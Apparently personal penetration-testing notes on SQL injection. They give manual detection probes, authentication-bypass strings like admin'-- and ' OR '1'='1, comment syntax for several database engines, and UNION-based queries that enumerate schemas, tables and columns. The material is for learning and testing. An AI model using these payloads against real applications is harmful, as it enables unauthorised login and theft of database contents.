---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/Server-Side/SQL-Injection/Exploitation
---

# Exploitation

SQL injection vulnerabilities can occur
at any location within the query,
and within different query types

- In [[MySQL/Usage#UPDATE|UPDATE]] statements,
  within the updated values or the [[MySQL/Usage#Filter|WHERE]] clause
- In [[MySQL/Usage#INSERT|INSERT]] statements,
  within the inserted values
- In [[MySQL/Usage#SELECT|SELECT]] statements,
  within the table or column name
- In [[MySQL/Usage#SELECT|UPDATE]] statements,
  within the [[MySQL/Usage#Sort|ORDER BY]] clause

<!-- Danger {{{-->
> [!danger] DO NOT USE
>
> If the condition reaches an [[MySQL/Usage#UPDATE|UPDATE]]
> or [[MySQL/Usage#DELETE|DELETE]] statement,
> it may result in loss of data
>
> ```sql
> # OR <true>
> ```
> ```sql
> OR 1=1
> ```
> ```sql
> ' OR '1'='1
> ```
>
> [Source](https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/)
>
<!-- }}} -->

<!-- References {{{-->
> [!info]- References
>
> OWASP WSTG
>
> - [SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
>
> Payloads
>
> - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-remote-code-execution)
>
> Articles
>
> - [Avoid OR 1=1](https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/)
>
<!-- }}} -->

___

<!-- Manual Testing {{{-->
## Manual Testing

Detect SQL injections manually, using a systematic set of tests

1. Inject data into the query to escape from current context
   and look for errors

<!-- Example {{{-->
> [!example]-
>
> ```sql
> '
> ```
> ```sql
> "
> ```
> ```sql
> `
> ```
> ```sql
> ')
> ```
> ```sql
> ")
> ```
> ```sql
> `)
> ```
> ```sql
> '))
> ```
> ```sql
> "))
> ```
> ```sql
> `))
> ```
>
<!-- }}} -->

2. [[General#Boolean-based|Boolean-based]]:
   Confirm vulnerability with logical operations

```sql
OR 1=1
```
```sql
OR 1=2
```

3. [[General#Time-based|Time-based]]:
   Enter payloads designed to trigger delays

4. [[General#Out-of-band|Out-of-band]]:
   Enter OAST payloads designed to trigger an out-of-band network interaction

___
<!-- }}} -->

<!-- Authentication Bypass {{{-->
## Authentication Bypass

1. The login page takes in the credentials

2. The query uses the `AND` operator to select records
   matching the given username and password

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'password';
```

3. SQL injection to break out the user input

```sql
admin'; -- -
```
```sh
admin')--
```

4. The query evaluates to `true`

```sql
SELECT * FROM users WHERE username = 'admin'; -- -' AND password = 'password'
```

<!-- OR Injection {{{-->
### OR Injection

The query must return `true`, regardless of the input

[MySQL operation precedence](https://dev.mysql.com/doc/en/operator-precedence.html)
states that the [[MySQL/Usage#AND|AND]] operator would be evaluated
before the [[MySQL/Usage#OR|OR]] operator

The query evaluates to `true`
if there is at least one `true` condition
along with an [[MySQL/Usage#OR|OR]] operator

<!-- Example {{{-->
> [!example]-
>
> Injected condition
>
> ```sql
> admin' or '1'='1
> ```
>
> Constructed query
>
> ```sql
> SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
> ```
>
> 1. [[MySQL/Usage#AND|AND]] operator is evaluated
>
> - `'1'='1'` evaluates `true`
> - `password='something'` evaluates `false`
> - The [[MySQL/Usage#AND|AND]] condition evaluates `false`
>   (*`true` AND `false` evaluates false*)
>
> 2. [[MySQL/Usage#OR|OR]] operator is evaluated
>
> - If `username='admin'` exists,
>   the entire query returns `true`
> - The `'1'='1'` condition doesn't affect
>   the outcome of the [[MySQL/Usage#AND|AND]] condition
>
> The query will return `true` if a username `admin` exists,
> bypassing authentication
>
> ![[or-injection.png]]
>
<!-- }}} -->

```sql
page.asp?id=1 or 1=1 -- results in true
```
```sql
page.asp?id=1' or 1=1 -- results in true
```
```sql
page.asp?id=1" or 1=1 -- results in true
```
```sql
page.asp?id=1 and 1=2 -- results in false
```

> [!todo]

<!-- }}} -->

<!-- Comments {{{-->
### Comments

SQL allows the use of comments to document queries
or ignore a certain part of the query

[[MySQL/General|MySQL]]

<!-- Example {{{-->
> [!example]-
>
> Single-line comment
>
> <!-- Info {{{-->
> > [!info]
> >
> > Single-line comments must have an empty space after the comment
> >
> <!-- }}} -->
>
> ```sql
> #comment
> ```
> ```sql
> -- comment
> ```
>
> Single-line comment (*URL-encoded*)
>
> ```sql
> --+comment
> ```
>
> Inline comment
>
> ```sql
> /*comment*/
> ```
>
> Multi-line comment
>
> ```sql
> /*
> comment
> */
> ```
>
> Executable comment
>
> ```sql
> /*! MYSQL Special SQL */
> ```
>
> ```sql
> SELECT /*! 80000 1 + 1 */ 0;
> ```
>
<!-- }}} -->

[[MSSQL/General|MSSQL]]

<!-- Example {{{-->
> [!example]-
>
> ```sql
> --single-line comment
> ```
> ```sql
> /*inline comment*/
> ```
>
<!-- }}} -->

PostgreSQL

<!-- Example {{{-->
> [!example]-
>
> Single-line comment
>
> ```sql
> --single-line comment
> ```
>
> Inline comment
>
> ```sql
> /*inline comment*/
> ```
>
> Multi-line comment
>
> ```sql
> /*
> Multi-line comment
> */
> ```
>
<!-- }}} -->

SQLite

<!-- Example {{{-->
> [!example]-
>
> ```sql
> --comment
> ```
> ```sql
> /*inline comment*/
> ```
>
<!-- }}} -->

Oracle

<!-- Example {{{-->
> [!example]-
>
> ```sql
> --single-line comment
> ```
>
<!-- }}} -->

HQL

- HQL does not support comments

**Authentication Bypass**

Ignore the remainder of the query

```sql
admin'--
```

<!-- Example {{{-->
> [!example]-
>
>  After evaluating the username (`admin`), the rest of the query
> is ignored as a comment
>
> ```sql
> SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
> ```
>
<!-- }}} -->

Bypass

```sql
admin')--
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SELECT * FROM logins where (username='admin')
> ```
>
<!-- }}} -->



<!-- }}} -->

<!-- Query Logic {{{-->
### Query Logic

Subverting query logic

```sql
SELECT * FROM logins WHERE username = 'admin' AND password = 'password';
```


<!-- }}} -->

___
<!-- }}} -->

<!-- Union Clause {{{-->
## Union Clause

1. Determine the number of columns the initial request is returning

<!-- Info {{{-->
> [!info]
>
> Both queries must return the same amount of columns
>
<!-- }}} -->

Incrementally adjust the number until a false response is received

[[MySQL/Usage#Sort|ORDER BY]]

```sql
' ORDER BY 1-- -
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> ' ORDER BY 1--+    #True
> ```
> ```sql
> ' ORDER BY 2--+    #True
> ```
> ```sql
> ' ORDER BY 3--+    #True
> ```
> ```sql
> ' ORDER BY 4--+    #False - Query is only using 3 columns
> ```
>
> URL-encoded space
>
> ```sql
> ' ORDER BY 1--+    #True
> ```
> ```sql
> ' ORDER BY 2--+    #True
> ```
> ```sql
> ' ORDER BY 3--+    #True
> ```
> ```sql
> ' ORDER BY 4--+    #False - Query is only using 3 columns
> ```
>
<!-- }}} -->

[[MySQL/Usage#Group|GROUP BY]]

```sql
' GROUP BY 1-- -
```

<!-- Example {{{-->
> [!example]-
>
>
> ```sql
> ' GROUP BY 1-- -
> ```
> ```sql
> ' GROUP BY 2-- -
> ```
> ```sql
> ' GROUP BY 3-- -
> ```
> ```sql
> ' GROUP BY 4-- -  #False - Query is using 3 columns
> ```
>
> URL-encoded
>
> ```sql
> ' GROUP BY 1--+
> ```
> ```sql
> ' GROUP BY 2--+
> ```
> ```sql
> ' GROUP BY 3--+
> ```
> ```sql
> ' GROUP BY 4--+  #False - Query is using 3 columns
> ```
>
<!-- }}} -->

[[MySQL/Usage#UNION|UNION]]

```sql
' UNION SELECT 1-- -
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> ' UNION SELECT 1-- -
> ```
> ```sql
> ' UNION SELECT 1,2-- -
> ```
> ```sql
> ' UNION SELECT 1,2,3-- -
> ```
>
> URL-encoded
>
> ```sql
> ' UNION SELECT 1--+
> ```
> ```sql
> ' UNION SELECT 1,2--+
> ```
> ```sql
> ' UNION SELECT 1,2,3--+
> ```
>
<!-- }}} -->

```sql
' UNION SELECT null-- -
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> ' UNION SELECT null-- -
> ```
> ```sql
> ' UNION SELECT null,null-- -
> ```
> ```sql
> ' UNION SELECT null,null,null-- -
> ```
>
> URL-encoded
>
> ```sql
> ' UNION SELECT null--+
> ```
> ```sql
> ' UNION SELECT null,null--+
> ```
> ```sql
> ' UNION SELECT null,null,null--+
> ```
>
<!-- }}} -->

2. Determine injection location

```sql
cn' UNION select 1,@@version,3,4-- -
```

3. Extract database information

Database names

```sql
-1' UNION SELECT 1,2,group_concat(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

Tables of a database

```sql
-1' UNION SELECT 1,2,3,group_concat(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=[database]
```

Column names

```sql
-1' UNION SELECT 1,2,3,group_concat(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=[table name]
```

**Uneven columns

```sql
SELECT "junk" FROM passwords
```

```sql
SELECT 1 FROM passwords
```

```sql
SELECT null FROM passwords
```

___
<!-- }}} -->

<!-- Boolean {{{-->
## Boolean

```sql
admin' AND '1'='1 / ' AND '1'='2
```
```sql
SELECT * FROM articles WHERE author = 'admin' AND '1'='1'
```

___
<!-- }}} -->
